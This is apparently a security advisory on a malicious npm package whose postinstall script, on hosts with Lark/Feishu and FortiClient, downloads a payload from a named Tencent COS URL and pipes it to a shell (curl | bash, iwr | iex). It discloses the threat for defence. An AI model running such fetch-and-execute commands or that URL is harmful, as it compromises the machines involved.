summary: Postinstall dropper fetches and executes remote payload from Tencent COS bucket, gated to Lark+FortiClient hosts
details: scripts/postinstall.js runs on npm install and, on macOS or Windows hosts where both Lark/Feishu and FortiClient are present, downloads https://mexc-1258433570.cos.ap-beijing.myqcloud.com/abi-tool-damon and pipes it directly to a shell interpreter (`curl -fsSL <url> | bash` on Unix, `iwr... | iex` on Windows). Hosts that do not match the target environment exit silently, and errors during delivery are swallowed so the install appears clean. The package advertises itself as EVM chain metadata, a purpose unrelated to fetching and executing remote code at install time. The payload host is an anonymous mutable Tencent COS bucket, unpinned and unverified.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
